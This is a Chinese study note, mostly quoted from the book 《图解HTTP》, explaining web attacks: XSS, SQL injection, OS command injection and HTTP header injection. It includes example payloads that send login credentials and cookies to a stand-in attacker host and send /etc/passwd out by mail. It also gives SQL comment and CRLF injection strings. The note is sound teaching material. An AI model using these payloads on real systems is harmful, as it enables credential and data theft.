# Web的攻击技术

---
绝大多数内容引自《图解HTTP》
---

互联网上的攻击大都将Web站点作为目标。

## 针对Web的攻击技术

简单的HTTP协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标。

目前，来自互联网的攻击大多是冲着Web站点来的，它们大多把Web应用作为攻击目标。

### HTTP 不具备必要的安全功能

与最初的设计相比，现今的Web网站应用的HTTP协议的使用方式已发生了翻天覆地的变化。
几乎现今所有的Web网站都会使用(session)管理、加密处理等安全性方面的功能，而HTTP协议并不具备这些功能。

从整体上看，HTTP就是一个通用的单纯协议机制。
因此它具备较多优势，但是在安全性方面则呈劣势。

就拿远程登录时会用到的SSH协议来说，SSH具备协议级别的认证及会话管理等功能，HTTP协议则没有。另外在架设SSH服务方面，任何人都可以轻易地创建安全等级高的服务，而HTTP即使已架设好服务器，但若想提供服务器基础上的Web应用，很多情况下都需要重新开发。

因此，开发者需要自行设计并开发认证及会话管理功能来满足Web应用的安全。而自行设计就意味着会出现各种形形色色的实现。结果，安全等级并不完备，可仍在运作的Web应用背后却隐藏着各种容易被攻击者滥用的安全漏洞的Bug。

### 在客户端即可篡改请求

在Web应用中，从浏览器那接收到HTTP请求的全部内容，都可以在客户端自由地变更、篡改。所以Web应用可能会接收到与预期数据不相同的内容。

在HTTP请求报文内加载攻击代码，就能发起对Web应用的攻击。通过URL查询字符串或表单、HTTP首部、Cookie等途径把攻击代码传入，若这时Web应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限。

### 针对Web应用的攻击模式

对Web应用的攻击模式有以下两种。

- 主动攻击
- 被动攻击
- 以服务器为目标的主动攻击

主动攻击(active attack)是指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问那些资源。

主动攻击模式里具有代表性的攻击是SQL注入攻击和OS命令注入攻击。

- 以服务器为目标的被动攻击

被动攻击（pssive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标Web应用发起攻击。

被动攻击通常的攻击模式如下所示。

**步骤1**

攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的HTTP请求。

**步骤2**

当用户 不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。

**步骤3**

中招后的用户浏览器会把含有攻击代码的HTTP请求发送还给作为攻击目标的Web应用，运行攻击代码。

**步骤4**

执行完攻击代码，存在安全漏洞的Web应用会成为攻击者的跳板，可能导致用户所持的Cookie等个人信息被窃取，登陆状态中的用户权限遭恶意滥用等后果。

被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造。

**利用用户的身份攻击企业内部网络**

利用被动攻击，可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户能够访问到的网络请求范围内，即使是企业内网也同样会受到攻击。

很多企业内网依然可以连接到互联网上，访问Web网站，或接收互联网发来的邮件。这样就可能给攻击者以可乘之机，诱导用户触发陷阱后对企业内网发动攻击。

## 因输出值转义不完全引发的安全漏洞

实施Web应用的安全对策可大致分为以下两部分。

- 客户端的验证
- Web应用端（服务器端）的验证
  
输入值验证 和 输出值转义

多数情况下采用JavaScript在客户端验证数据。可是在客户端允许篡改数据或关闭JavaScript验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高UI体验的作用。

Web应用端的输入值验证按Web应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。

从数据库或文件系统、HTML、邮件等输出Web应用处理的数据之际，针对输出做值转义处理时一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。

### 跨站脚本攻击

跨站脚本攻击（Cross-Site Scripting， XSS）是指通过存在安全漏洞的Web网站，在浏览器内运行非法的HTML标签或JavaScript进行的一种攻击。动态创建的HTML部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。

跨站脚本攻击有可能造成以下影响。

- 利用虚假输入表单骗取用户个人信息。
- 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
- 显示伪造的文章或图片。


跨站脚本攻击案列

在动态生成HTML处发生。

浏览器会把用户输入的\<s>解析成HTML标签，然后显示删除线。

**删除线显示出来并不会造成太大的不利后果，但如果换成使用script标签将会如何呢？**

XSS是攻击者利用预先设置的陷阱触发的被动攻击

跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。

```
通过地址栏中URI的查询字段指定ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。
```

重复熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的URL。
并隐藏植入事先准备好的欺诈邮件中或Web页面内，诱使用户去点击该URL。

```
http://example.jp/login?ID="><scirpt>var+f=document.getElementById("login"); +f.action="http://hackr.jp/pwget";+f.method="get";</script><span+s=">
```

浏览器打开该URI后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入ID和密码之后，就会直接发送到攻击者的网站 （也就是hackr.jp），导致个人登录信息被窃取。

之后，ID及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登陆信息已遭泄漏。

```
对 http://example.jp/login?ID=yama 请求时对应的HTML源代码

<div class="logo">
<img src="/img/logo.gif" alt="E! 拍卖会"/>
</div>

<form action="http://example.jp/login" method="post" id="login">
<div class="input_id">
ID <input type="text" name="ID" value="yama"/>
</div>



http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script><span+s=" 请求时对应的HTML源代码

<div class="logo">
    <img src="/img/logo.gif" alt="E! 拍卖会/>
</div>
<form action="http://example.jp/login" method="post" id="login">
    <div class="input_id">
    ID <input type="text" name="ID" value="">
    <script>
    var f = document.getElementById("login");
    f.action = "http://hackr.jp/pwget;
    f.method = "get";
    </script>
    <span s="" />
    </div>
</form>
```

- 对用户Cookie的窃取攻击

除了在表单中设下圈套之处，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的Cookie信息。

```
<script src="http://hackr/jp/xss.js></script>
```

该脚本内指定的"http://hack.jp/xss.js"文件。即下面这段采用JavaScript编写的代码。

```
var content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">");
```

在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段JavaScript程序，即可访问到该Web应用所处域名下的Cookie信息。然后这些信息会发送至攻击者的Web网站（http://hackr.jp/)，记录在他的登陆日志中。结果，攻击者就这样窃取到用户的Cookie信息了。


### SQL注入攻击

- 会执行非法SQL的SQL注入攻击

SQL注入（SQL Injection）是指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄漏。

Web应用通常都会用到数据库，当需要对数据库表内的数据进行检索或添加、删除等操作时，会使用SQL语句连接数据库进行特定的操作。如果在调用SQL语句的方式上存在疏漏，就有可能执行被恶意注入（Injection）非法SQL语句。

SQL注入攻击有可能会造成以下等影响。

- 非法查看或篡改数据库内的数据
- 规避认证
- 执行和数据库服务器业务关联的程序等

**何为SQL**

SQL是用来操作关系型数据库管理系统（Relational DataBase Management System，RDBMS）的数据库语言，可进行操作数据或定义数据等。

RDBMS 中有名的数据库有 Oracle Database、Microsoft SQL Server、IBM D82、MySQL 和 Postgre SQL等。这些数据库系统都可以把SQL作为数据库语言使用。

使用数据库的Web应用，通过某种方法将SQL语句传给RDBMS，再把RDBMS返回的结果灵活地使用在Web应用中。

- SQL语句示例

```
SELECT title,text FROM newsTb1 WHERE id=123
```

- SQL注入攻击案列

下面以某个购物网站的搜索功能为例，讲解SQL注入攻击。通过该功能，我们可将某作者的名字作为搜索关键字，查找该作者的所有著作。

```
//将“上官宣”作为关键字的搜索结果。

http://example.com/search?q=上官宣

SQL语句

SELECT * FROM bookTblWHERE author="上官宣"and flag = 1;

从bookTbl表中，显示满足author=上官宣 and flag = 1（可售）所在行的数据。
```

URL的查询字段已指定q=上官宣，这个值由Web应用传入到SQL语句中，构成下方的SQL语句。

```
SELECT * FROM bookTbl WHERE author = '上官宣' and flag = 1;
```

数据库内的bookTbl 表记录着该购物网站的所有书籍信息。通过SQL语句，将满足作者名(author)上官宣并且flag为1双重条件的条目取出，最后作为搜索结果显示出来。


---

SQL注入攻击的操作示例

把刚才指定查询字段的上官宣改写成“上官宣'--”。

```
http://example.com/search?q=上官宣'--
```

构成的SQL语句就变成"从数据库的bookTbl表中，显示满足 author= 上野宣条件所在行的数据”。

```
SELECT * FROM bookTbl WHERE author ='上官宣' - -' and flag=1;
```

SQL语句中的 -- 之后全视为注释。即，and flag=1 这个条件被自动忽略了。

结果跟flag的设定值无关，只取出满足 author="上官宣"条件所在行的数据，这样链那些尚未出版的书籍也一并显示出来了。

SQL注入是攻击者将SQL语句改变成开发者一项不到的形式以达到破坏结构的攻击。

比如，在之前的攻击案例中，就会把author的字面值（程序中使用的常量）"'上官宣'--"的字符串赋值给 $q。

```

SELECT * FROM bookTbl WHERE author = '$q' and flag = 1;

SELECT * FROM bookTbl WHERE author = '上官宣' --' and flag = 1;
```

本案例中的问题仅仅是把未出版书籍的条目也一同显示出来了。
但实际发生SQL注入攻击时，很有可能会导致用户信息或结算内容等其他数据表的非法浏览器及篡改，从而使用户遭到不同程度的损失。

### OS命令注入攻击

OS 命令注入攻击（OS Command Injection）是指通过Web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险。

可以从Web应用中通过Shell来调用操作系统命令。如果调用Shell时存在疏漏，就可以执行插入的非法OS命令。

OS 命令注入攻击可以像Sheel发送命令，让Windows或Linux操作系统的命令行启动程序。也就是说，通过OS注入攻击可执行OS上安装着的各种程序。

- OS注入攻击案例

下面以咨询表单的发送功能为例，讲解OS注入攻击。
该功能可将用户的咨询邮件按已填写的对方邮箱地址发送过去。

下面摘选处理该表单内容的一部分核心代码。

```
my $adr = $q->param('mailaddress');
open(MAIL, "| /usr/sbin/sendmail$adr");
print MAIL "From: info@example.com\n";
```

程序中的open函数会调用 sendmail命令发送邮件，而指定的邮件发送地址即$adr的值。

攻击者将下面的值指定作为邮件地址。

```
; cat /etc/passwd | mail hack@example.jp
```

程序接收该值，构成以下的命令组合。

```
| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp
```

攻击者的输入值中含有分号（;）。
这个符号在OS命令中，会被解析为分隔多个执行命令的标记。

可见，sendmail 命令执行被分隔后，接下去就会执行 cat/etc/passwd | mail hack@example.jp 这样的命令了。结果，含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 hack@example.jp。


### HTTP首部注入攻击

HTTP首部注入攻击(HTTP Header Injection)是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。

向首部主体内添加内容的攻击称为HTTP响应截断攻击（HTTP Response Splitting Attack)。

如下所示，Web应用有时会把从外部接收到数值，赋给响应首部字段Location 和 Set-Cookie。

```
Location: http://www.example.com/a.cgi?q=12345
Set-Cookie: UID=12345
```

HTTP首部注入可能像这样，通过在某些响应首部字段需要输出值的地方，插入换行发动攻击。

HTTP首部注入攻击有可能会造成以下一些影响。

- 设置任何Cookie信息
- 重定向至任意URL
- 显示任意的主体（HTTP响应截断攻击）
- HTTP首部注入攻击案列

下面我们以选定某个类别后即可跳转至各类别对应页面的功能为例，讲解HTTP首部注入攻击。

该功能为每个类别都设定了一个类别ID值，一旦选定某类别，就会将该ID值反映在响应内的Location首部字段值内，行如 Location: http://example.com/?cat=101。令浏览器发生重定向跳转。

攻击者以下面的内容代替之前的类别ID后发送请求。

```
101%0D%0ASet-Cookie: +SID=123456789
```

其中，%0D%0A代表HTTP报文中的换行符，紧接着的是可强制将攻击者网站（http://hacker.jp/）的会话ID设置成SID=123456789 的 Set-Cookie 首部字段。

发送该请求之后，假设结果返回以下响应。

```
Location: http://example.com/?cat=101(%0D%0A: 换行符)
Set-Cookie: SID=123456789
```

此刻，首部字段Set-Cookie 已生效，因此攻击者可指定修改任意的Cookie信息。通过和会话固定攻击组合，攻击者可伪装成用户。

攻击者输入的 %0D%0A，原本应该属于首部字段Location的查询值部分，但经过解析后，%0D%0A 变成了换行符，结果插入了新的首部字段。

这样一来，攻击者可以响应中插入任意的首部字段。

- HTTP响应截断攻击

HTTP响应截断攻击是用在HTTP首部注入的一种攻击。

攻击顺序相同，但是要将两个 %0D%0A% 并排插入字符串后发送。

利用这两个连续的换行就可作出HTTP首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻击叫做HTTP响应截断攻击。

```
%0D%0A%0D%0A<HTML><HEAD><TITLE>之后，想要显示的网页内容<!--
```

在可能进行HTTP首部注入的环节，通过发送上面的字符串，返回结果得到以下这种响应。

```
Set-Cookie: UID= (%0D%OA: 换行符)
(%0D%OA : 换行符)
<HTML><HEAD><TITLE>之后，想要显示的网页内容<!-- （原来页面对应的首部字段和主体部分全视为注释）
```

利用这个攻击，已触发陷阱的用户浏览器会显示伪造的Web页面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果。

另外，滥用 HTTP/1.1 中汇集多响应返回功能，会导致缓存服务器对任意内容进行缓存操作。这种攻击称为缓存污染。使用该缓存服务器的用户，在浏览遭受攻击的网站，会不断地浏览器被替换掉的Web网页。